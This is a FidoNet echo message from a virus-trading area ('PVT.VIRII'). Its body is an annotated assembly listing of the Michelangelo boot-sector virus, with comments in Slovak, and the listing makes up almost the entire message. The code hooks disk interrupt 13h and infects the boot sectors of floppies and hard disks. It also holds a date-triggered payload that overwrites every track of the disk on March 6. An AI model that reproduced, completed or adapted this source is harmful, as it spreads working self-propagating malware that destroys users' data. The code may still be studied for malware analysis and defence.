;Ä PVT.VIRII (2:465/65.4) ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ PVT.VIRII Ä
; Msg  : 33 of 54
; From : MeteO                               2:5030/136      Tue 09 Nov 93 09:14
; To   : -  *.*  -                                           Fri 11 Nov 94 08:10
; Subj : MICHANGL.A1
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;.RealName: Max Ivanov
;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
;* Kicked-up by MeteO (2:5030/136)
;* Area : VIRUS (Int: ˆ­ä®p¬ æ¨ï ® ¢¨pãá å)
;* From : Ron Toler, 2:283/718 (06 Nov 94 16:58)
;* To   : Mike Salvino
;* Subj : MICHANGL.A1
;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
;@RFC-Path:
;ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
;18.n283!not-for-mail
;@RFC-Return-Receipt-To: Ron.Toler@f718.n283.z2.fidonet.org
obsluha 13h:    push    ds
        push    ax
        or  dl,dl           ; drive a: ?
        jnz loc_1           ; ak nie, stara obsluha
        xor ax,ax           ; ak ano, pozri ci motor bezi
        mov ds,ax           ; (ked bezi, tak by odbiehanie
                        ; na boot sektor bolo napadne
                        ; - hrcal by disk, pri zapnuti
                        ; sa to strati)
        test    byte ptr ds:[43Fh],1    ; (0000:043F=10h)
        jnz loc_1           ; ak bezi, tak stara obsluha
        pop ax          ; ak nebezi, tak stara obsluha
        pop ds
        pushf
        call    dword ptr cs:[0Ah]
        pushf               ; Push flags
        call    sub_1           ; rozmnoz sa na a:
        popf                ; Pop flags
        retf    2           ; vrat sa z int s tymito flagmi
loc_1:
        pop ax
        pop ds
        jmp dword ptr cs:[0Ah]  ; stara obsluha

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                MNOZENIE SA
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_1       proc    near
        push    ax          ; SCHOVAJ REGS
        push    bx
        push    cx
        push    dx
        push    ds
        push    es
        push    si
        push    di
        push    cs
        pop ds
        push    cs
        pop es
        mov si,4
loc_2:
        mov ax,201h         ; 1 sektor citaj
        mov bx,200h         ; za seba (si 512 b. dlhy)
        mov cx,1            ; boot sektor (1. na 0. stope)
        xor dx,dx           ; disk a:
        pushf
        call    dword ptr ds:[0Ah]  ; stara obsluha
        jnc loc_3           ; error ?
        xor ax,ax           ; error - disk reset
        pushf               ;
        call    dword ptr ds:[0Ah]  ; (6C20:000A=0AF1Ah)
        dec si
        jnz loc_2           ; skus to 4 x
        jmp short loc_6     ; a ked nic, vykasli sa na to
loc_3:
        xor si,si           ; vsetko ok, pokracujeme
        cld
        lodsw               ; porovnaj prve 4 byte z bootu
        cmp ax,[bx]         ; so sebou, aby si zistil, ci
        jne loc_4           ; uz si tam - nakazeny disk
        lodsw
        cmp ax,[bx+2]
        je  loc_6           ; ak si tam, netrba infikovat
                        ; "AIDS staci dostat raz."
loc_4:
        mov ax,301h         ; avsak ak tam nie si, tak
        mov dh,1            ; ten disk nakaz
        mov cl,3            ; nastav znacku, kam odlozit
        cmp byte ptr [bx+15h],0FDh  ; povodny boot
        je  loc_5           ; (do ktoreho sektora)
        mov cl,0Eh          ; podla typu diskety
loc_5:                      ; (0e - HD, 3 - DD, 7 - hard)
        mov word ptr ds:[8],cx  ; uloz znacku
        pushf               ; a zapis povodny boot
        call    dword ptr ds:[0Ah]
        jc  loc_6           ; error - neda sa - vyskoc von
        mov si,3BEh         ; dopis originalnu partition
        mov di,1BEh         ; na svoj koniec
        mov cx,21h
        cld
        rep movsw
        mov ax,301h         ; a zapis sa do bootu
        xor bx,bx
        mov cx,1
        xor dx,dx
        pushf               ; cez staru int 13h
        call    dword ptr ds:[0Ah]
loc_6:
        pop di          ; hotovo - koniec
        pop si
        pop es
        pop ds
        pop dx
        pop cx
        pop bx
        pop ax
        retn
sub_1       endp

START VIRUSU    xor ax,ax
        mov ds,ax           ; DS NA NULU
        cli             ; Disable interrupts
        mov ss,ax           ; stack pod seba
        mov ax,7C00h        ; tu si - natiahol si sa
        mov sp,ax           ; z bootu - sp pod seba
        sti             ; Enable interrupts
        push    ds          ; schovaj ds,ax
        push    ax
        mov ax,word ptr ds:[4Ch]    ; odloz si staru obsluhu int13h
        mov word ptr ds:[7C0Ah],ax
        mov ax,word ptr ds:[4Eh]
        mov word ptr ds:[7C0Ch],ax
        mov ax,word ptr ds:[413h]   ; top of memory zmensi o 2K
        dec ax
        dec ax
        mov word ptr ds:[413h],ax
        mov cl,6            ; prepocitaj na paragr. adr.
        shl ax,cl
        mov es,ax           ; nastav es
        mov word ptr ds:[7C05h],ax  ; a odloz si ju sem
        mov ax,0Eh          ; toto je offset noveho int13h
        mov word ptr ds:[4Ch],ax    ; nastav ten novy int
        mov word ptr ds:[4Eh],es
        mov cx,1BEh         ; skopiruj sa do vyhr. 2K pam.
        mov si,7C00h
        xor di,di
        cld
        rep movsb
        jmp dword ptr cs:[7C03h]    ; a skoc na seba po skopirovani
        xor ax,ax           ; sem skocis
        mov es,ax           ; 0 do es
        int 13h         ; reset disk a:
        push    cs          ; cs do ds
        pop ds
        mov ax,201h         ; precitaj boot
        mov bx,7C00h        ; do 7c00
        mov cx,word ptr ds:[8]  ; pozri si znacku, kde mas ulo-
                        ; zeny povodny boot
        cmp cx,7            ; ak je to 7 - tak si na harde
        jne loc_7           ; inak si na diskete
        mov dx,80h          ; na harde - c:
        int 13h         ; precitaj originalny boot
        jmp short loc_8     ; a pokracuj
loc_7:
        mov cx,word ptr ds:[8]  ; precitaj si kde mas boot
        mov dx,100h         ; z diskety
        int 13h
        jc  loc_8           ; error - nejde to - skonci
        push    cs          ; ak to ide cs do es
        pop es
        mov ax,201h         ; a precitaj si este boot
        mov bx,200h         ; za seba
        mov cx,1
        mov dx,80h          ; ale z hardu
        int 13h
        jc  loc_8           ; chyba - von
        xor si,si           ; porovnaj sa s bootom
        cld             ; ci je harddisk nakazeny
        lodsw
        cmp ax,[bx]
        jne loc_13
        lodsw
        cmp ax,[bx+2]
        jne loc_13          ; ak nie je nakazeny - nakaz
loc_8:
        xor cx,cx           ; 0 do cx
        mov ah,4
        int 1Ah         ; pozri si datum
                        ; ci je 6. 3.
        cmp dx,306h
        je  loc_9           ; ak je 6.3. - akcia
        retf                ; ak nie - von
loc_9:
        xor dx,dx           ; TOT' UCINOK VIRUSU
        mov cx,1            ; zacni na 0. stope a 1. sktr
loc_10:
        mov ax,309h         ; zapis 9 sektorov
        mov si,word ptr ds:[8]  ; pozri typ disku
        cmp si,3            ; disketa -> rovno zapis
        je  loc_11
        mov al,0Eh          ; HD disketa -> 14 sektorov
        cmp si,0Eh
        je  loc_11          ; a rovno zapis
        mov dl,80h          ; nie disketa - hard
        mov byte ptr ds:[7],4   ; tak nie 2, ale 4 hlavy
        mov al,11h          ; a 17 sektorov/ track
loc_11:
        mov bx,5000h        ; zober hocico z pamati
        mov es,bx
        int 13h         ; a zapis na disk
        jnc loc_12          ; nie je chyba - pokracuj
        xor ah,ah           ; chyba - reset disk
        int 13h
loc_12:
        inc dh          ; dalsia hlava ?
        cmp dh,byte ptr ds:[7]  ; max. headroom
        jb  loc_10          ; este nie - pokracuj
        xor dh,dh           ; ano - opat hlava 0
        inc ch          ; dalsi track
        jmp short loc_10        ; a znova
loc_13:
        mov cx,7            ; NAKAZENIE HARDU
        mov word ptr ds:[8],cx  ; sem uloz povodny boot
        mov ax,301h
        mov dx,80h
        int 13h
        jc  loc_8           ; error - out
        mov si,3BEh         ; no error - dopis partition
        mov di,1BEh
        mov cx,21h
        rep movsw
        mov ax,301h         ; a zapis sa do bootu
        xor bx,bx
        inc cl
        int 13h
        jmp short loc_8     ; a chod von

-+-  DinoMail v.1.0 Alpha
 + Origin: I just hate people who create virusses... (2:283/718)
=============================================================================

Yoo-hooo-oo, -!


    þ The MeÂeO

/Txx          Specify output file type

--- Aidstest Null: /Kill
 * Origin: ùPVT.ViRIIúmainúboardú / Virus Research labs. (2:5030/136)

